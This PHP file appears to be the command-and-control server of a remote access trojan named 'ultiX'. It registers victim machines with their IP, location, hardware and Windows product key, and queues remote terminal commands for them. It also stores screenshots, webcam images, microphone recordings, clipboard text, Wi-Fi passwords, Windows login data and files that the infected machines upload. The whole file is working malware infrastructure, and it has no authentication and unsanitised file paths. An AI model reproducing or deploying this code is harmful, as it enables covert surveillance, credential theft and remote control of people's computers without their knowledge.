<?php
$Agent_UID = $_POST["uid"];
$path_to_agents = "../ultiX-Data/data.json";
$agent_UID_Folder_Screenshots = "../ultiX-Data/" . $Agent_UID . "/screenshots";
$agent_UID_Folder_Camera = "../ultiX-Data/" . $Agent_UID . "/camera";

function CreateJson($json) {
    return json_encode($json, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}

function CheckCmdDb() {
    global $path_to_agents;

    $agentUID = $_POST["uid"];
    
    $strJsonFileContents = file_get_contents($path_to_agents);
    $JsonFileCommand = json_decode($strJsonFileContents, true);
    
    $commandFullPath = $JsonFileCommand["agents"][$agentUID]["commands"];
    $commandType = $JsonFileCommand["agents"][$agentUID]["commands"]["command"];
    $commandParameters = $JsonFileCommand["agents"][$agentUID]["commands"]["commandParameter"];

    if(isset($commandType) && isset($commandParameters)){
        $data = new stdClass();
        $data->command = $commandType;
        $data->commandParameters = $commandParameters;

        $finishedDataJSON = json_encode($data);
        echo $finishedDataJSON;
        unset($JsonFileCommand["agents"][$_POST["uid"]]["commands"]);
        file_put_contents($path_to_agents, createJson($JsonFileCommand));
    }
}
function CommandToDB() {
    global $path_to_agents;

    $strJsonFileContents = file_get_contents($path_to_agents);
    $victim_array = json_decode($strJsonFileContents, true);
    $victim_array["agents"][$_POST['uid']]['commands']["command"] = $_POST["command"];
    $victim_array["agents"][$_POST['uid']]['commands']["commandParameter"] = $_POST['parameters'];
    file_put_contents($path_to_agents, json_encode($victim_array, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    if ($_POST["command"] == "terminal"){
        echo "Successfull added " . $_POST["parameters"] . " to Database";
    } else {
        echo "Successfull added " . $_POST["command"] . " to Database";
    }
    exit(0);
}
function AgentToDB() {
    global $path_to_agents;
    global $agent_UID_Folder_Screenshots;

    $folder_uid = "../ultiX-Data/".$_POST["uid"];

    $list = array("commands");

    $JsonCommandsFile = "../../ultiX-Data/" . $_POST["uid"] . "/terminal.json";

    if(!is_dir($folder_uid)){
        mkdir($folder_uid);
        mkdir($agent_UID_Folder_Screenshots);
        $JsonCommandFile = fopen($JsonCommandsFile,  "w+");
        fwrite($JsonCommandFile, json_encode($list));
        fclose($JsonCommandFile);
    } 

    $strJsonFileContents = file_get_contents($path_to_agents);
    $AgentArray = json_decode($strJsonFileContents, true);

    $commandFullPath = $AgentArray["agents"][$_POST["uid"]]["commands"];

    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y H:i:s");

    echo "data: ". $commandFullPath ."|";
    if (isset($commandFullPath)) {
        echo " ALready Command in DB";

        exit(0); # If there are commands stored in a UID it dont matter what the post info is. So by not adding the post we will not touch the existing data. 
    } else {
        echo "Adding to DB";
        $agentPost = [
            "uid" => $_POST["uid"],
            "LastOnline" => $currentDate,
            "Status" => $_POST["status"],
            "Persist" => $_POST["persist"],
            "PersistDir" => $_POST["persistDir"],
            "PublicIP" => $_POST["publicIP"],
            "PrivateIP" => $_POST["privateIP"],
            "Country" => $_POST["ipcountry"],
            "CountryCode" => $_POST["ipcountrycode"],
            "SysArch" => $_POST["sysarchitecture"],
            "OS" => $_POST["os"],
            "platform" => $_POST["platform"],
            "PCUsername" => $_POST["username"],
            "RAM" => $_POST["ram"],
            "CPU" => $_POST["cpu"],
            "GPU" => $_POST["gpu"],
            "Format" => $_POST["format"],
            "InstallationDIR" => $_POST["installDir"],
            "TotalMonitors" => $_POST["totalMonitors"],
            "ProductKEY" => $_POST["prodKey"],
            "BatteryStatus"=> $_POST["batteryStatus"],
            "Lat" => $_POST["latitude"],
            "Long" => $_POST["longitude"],
            "ipTimezone" => $_POST["iptimezone"],
            "ipCity" => $_POST["ipcity"],
            "ipContinent" => $_POST["ipcontinent"],
            "ipRegion" => $_POST["ipregion"],
            "DiskTotalSize" => $_POST["disksizetotal"],
            "DiskTotalUsed" => $_POST["disksizeused"],
            "DiskTotalFree" => $_POST["disksizefree"],
            "isVM" => $_POST["vm"],
            "systemLan" => $_POST["syslan"]
        ];
        $AgentArray["agents"][$_POST["uid"]] = $agentPost;
        file_put_contents($path_to_agents, CreateJson($AgentArray));
    }
    exit(0);
}

function ScreenshotHandle() {
    $Agent_UID = $_POST["uid"];
    $data = $_FILES["file"];
    $code = $data["error"];

    $randomStr = rand(10000000, 1000000000000000000);
    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y-H:i:s");
    $fullName = $currentDate . "RandomStr" . $randomStr;
    $Folder_Path = "../ultiX-Data/" . $Agent_UID . "/screenshots";
    $dest = "../ultiX-Data/" . $Agent_UID . "/screenshots/" . $fullName . ".png";
    if (!file_exists($Folder_Path)){
        mkdir($Folder_Path);
    }


    $src = $data["tmp_name"];
    move_uploaded_file($src, $dest);    
    
}

function CameraHandle() {
    $Agent_UID = $_POST["uid"];
    $data = $_FILES["file"];
    $code = $data["error"];

    $Folder_Path = "../ultiX-Data/" . $Agent_UID . "/camera";
    if (!file_exists($Folder_Path)){
        mkdir($Folder_Path);
    }
    $randomStr = rand(10000000, 1000000000000000000);
    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y-H:i:s");
    $fullName = $currentDate . "RandomStr" . $randomStr;

    $dest = "../ultiX-Data/" . $Agent_UID . "/camera/" . $fullName . ".png";
    $src = $data["tmp_name"];
    move_uploaded_file($src, $dest);    
    
}


function Terminal() {
    $Agent_UID = $_POST["uid"];
    $TerminalCommandName = $_POST["data"];
    $TerminalCommandOutput = $_POST["data1"];

    $Terminal_File_Path = "../ultiX-Data/" . $Agent_UID . "/terminal.json";

    if (!file_exists($Terminal_File_Path)) {
        $Terminal_File_Json = fopen($Terminal_File_Path, "w+");
    }


    $CommandList = [
        "commandTitle" => $_POST["data"],
        "command" => $_POST["data1"]
    ];

    // $Terminal_Json_Encoded = json_encode($CommandList);
    $strJsonFileContents = file_get_contents($Terminal_File_Path);
    $CommandArray = json_decode($strJsonFileContents, true);
    $CommandArray["commands"]["command"] = $CommandList;
    file_put_contents($Terminal_File_Path, CreateJson($CommandArray));
    exit(0);

}

function downloadedFilesHandle() {
    $Agent_UID = $_POST["uid"];
    $data = $_FILES["file"];
    $filename = $_POST["fileName"];

    $Folder_Path = "../ultiX-Data/" . $Agent_UID . "/downloadedFiles";
    if (!file_exists($Folder_Path)){
        mkdir($Folder_Path);
    }
    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y-H:i:s");
    $fullName = $currentDate . "Fn" . $filename;

    $dest = "../ultiX-Data/" . $Agent_UID . "/downloadedFiles/" . $fullName;
    $src = $data["tmp_name"];
    move_uploaded_file($src, $dest);    
}

function Clipboard() {
    $Agent_UID = $_POST["uid"];
    echo "valid";
    $Clipboard_Data_File = "../ultiX-Data/" . $Agent_UID . "/clipboard.json";

    if (!file_exists($Clipboard_Data_File)) {
        fopen($Clipboard_Data_File, "w+");
    }

    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y-H:i:s");

    echo "Adding" . $_POST["clipdata"];
    
    $data_clip = [
        "date" => $currentDate,
        "clipDat" => $_POST["clipdata"]
    ];

    $strJsonFileContents = file_get_contents($Clipboard_Data_File);
    $Data = json_decode($strJsonFileContents, true);
    $Data["clip"][$currentDate] = $data_clip;
    file_put_contents($Clipboard_Data_File, CreateJson($Data));
    exit(0);
}

function WifiPasswords() {
    $Agent_UID = $_POST["uid"];
    echo "valid";
    $Wifi_Data_File = "../ultiX-Data/" . $Agent_UID . "/wifi.json";

    if (!file_exists($Wifi_Data_File)) {
        fopen($Wifi_Data_File, "w+");
    }

    echo "Adding" . $_POST["data"];
    
    $data_wifi = [
        "wifi" => $_POST["data"]
    ];

    $strJsonFileContents = file_get_contents($Wifi_Data_File);
    $Data = json_decode($strJsonFileContents, true);
    $Data["wifi"] = $data_wifi;
    file_put_contents($Wifi_Data_File, CreateJson($Data));
    echo "created";
    exit(0);
}

function Proc() {
    $Agent_UID = $_POST["uid"];
    echo "valid";
    $proc_File = "../ultiX-Data/" . $Agent_UID . "/proc.json";

    if (!file_exists($proc_File)) {
        fopen($proc_File, "w+");
    }

    echo "Adding" . $_POST["data"];
    
    $data_proc = [
        "proc" => $_POST["data"]
    ];

    $strJsonFileContents = file_get_contents($proc_File);
    $Data = json_decode($strJsonFileContents, true);
    $Data["proc"] = $data_proc;
    file_put_contents($proc_File, CreateJson($Data));
    echo "created";
    exit(0);
}

function Window() {
    $Agent_UID = $_POST["uid"];
    echo "valid";
    $window_File = "../ultiX-Data/" . $Agent_UID . "/window.json";

    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y-H:i:s");


    if (!file_exists($window_File)) {
        fopen($window_File, "w+");
    }

    echo "Adding" . $_POST["data"];
    
    $data_proc = [
        "CurrentDate" => $currentDate,
        "window" => $_POST["data"]
    ];

    $strJsonFileContents = file_get_contents($window_File);
    $Data = json_decode($strJsonFileContents, true);
    $Data["window"][$currentDate] = $data_proc;
    file_put_contents($window_File, CreateJson($Data));
    echo "created";
    exit(0);
}

function WinLogin() {
    $Agent_UID = $_POST["uid"];
    echo "valid";
    $winLogin_File = "../ultiX-Data/" . $Agent_UID . "/winlogin.json";

    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y-H:i:s");


    if (!file_exists($winLogin_File)) {
        fopen($winLogin_File, "w+");
    }

    echo "Adding" . $_POST["data"];


    $winlogin = $_POST["data"];
    $winlogin_valid = str_replace("\n", "", $winlogin);
    $winlogin_valid1 = str_replace("\r", "", $winlogin_valid);

    $data_proc = [
        "CurrentDate" => $currentDate,
        "winlogin" => $winlogin_valid1 
    ];

    $strJsonFileContents = file_get_contents($winLogin_File);
    $Data = json_decode($strJsonFileContents, true);
    $Data["winlogin"][$currentDate] = $data_proc;
    file_put_contents($winLogin_File, CreateJson($Data));
    echo "created";
    exit(0);
}

function FileManager() {
    $Agent_UID = $_POST["uid"];

    $FileManager_File_Path = "../ultiX-Data/" . $Agent_UID . "/files.json";

    if (!file_exists($FileManager_File_Path)) {
        $Terminal_File_Json = fopen($FileManager_File_Path, "w+");
    }


    $Files= [
        "dir" => $_POST["dir"],
        'files' => $_POST["data"],
    ];

    // $Terminal_Json_Encoded = json_encode($CommandList);
    $strJsonFileContents = file_get_contents($FileManager_File_Path);
    $CommandArray = json_decode($strJsonFileContents, true);
    $CommandArray["files"] = $Files;
    file_put_contents($FileManager_File_Path, CreateJson($CommandArray));
    exit(0);

}

function MicHandle() {
    $Agent_UID = $_POST["uid"];
    $data = $_FILES["file"];
    $code = $data["error"];

    $Folder_Path = "../ultiX-Data/" . $Agent_UID . "/mic";
    if (!file_exists($Folder_Path)){
        mkdir($Folder_Path);
    }
    $randomStr = rand(10000000, 1000000000000000000);
    date_default_timezone_set("Europe/Amsterdam");
    $currentDate = date("d-m-Y-H:i:s");
    $fullName = $currentDate . "RandomStr" . $randomStr;

    $dest = "../ultiX-Data/" . $Agent_UID . "/mic/" . $fullName . ".wav";
    $src = $data["tmp_name"];
    move_uploaded_file($src, $dest);    
    
}

function DeleteUID($uid) {
    global $path_to_agents;

    $agentUID = $uid;
    $strJsonFileContents = file_get_contents($path_to_agents);
    $JsonFileCommand = json_decode($strJsonFileContents, true);
    
    $commandFullPath = $JsonFileCommand["agents"][$agentUID];

    if (isset($commandFullPath)) {
        unset($JsonFileCommand["agents"][$_POST["uid"]]);
        file_put_contents($path_to_agents, createJson($JsonFileCommand));
        echo " Deleted " . $uid . "!";
    }
}

if(isset($_POST["uid"]) && isset($_POST["command"])){
    if ($_POST["command"] == "deleteUID") {
        DeleteUID($_POST["uid"]);
    } else {
        CommandToDB();
    }

}

if(isset($_POST["uid"]) && isset($_POST["addToDb"])){
    AgentToDB();
}

if(isset($_POST["uid"]) && $_POST["checkCmd"]) {
    CheckCmdDb();
}

if(isset($_POST["uid"]) && isset($_FILES["file"]) && isset($_POST["screenshot"])){
    ScreenshotHandle();
}

if(isset($_POST["uid"]) && isset($_FILES["file"]) && isset($_POST["camera"])){
    CameraHandle();
}

if(isset($_POST["uid"]) && isset($_FILES["file"]) && isset($_POST["microphone"])){
    MicHandle();
}

if(isset($_POST["uid"]) && isset($_POST["terminal"])){
    Terminal();
}

if(isset($_POST["uid"]) && isset($_POST["exploreFiles"])){
    FileManager();
}

if(isset($_POST["uid"]) && isset($_POST["downloadFile"])){
    downloadedFilesHandle();
}

if(isset($_POST["uid"]) && isset($_POST["clipboard"])) {
    Clipboard();
}

if(isset($_POST["uid"]) && isset($_POST["wifi"])) {
    WifiPasswords();
}

if(isset($_POST["uid"]) && isset($_POST["proc"])) {
    Proc();
}

if(isset($_POST["uid"]) && isset($_POST["window"])) {
    Window();
}

if(isset($_POST["uid"]) && isset($_POST["winlogin"])) {
    WinLogin();
}

if(isset($_POST["uid"]) && isset($_POST["deleteUID"])) {
    DeleteUID($_POST["uid"]);
}
?>
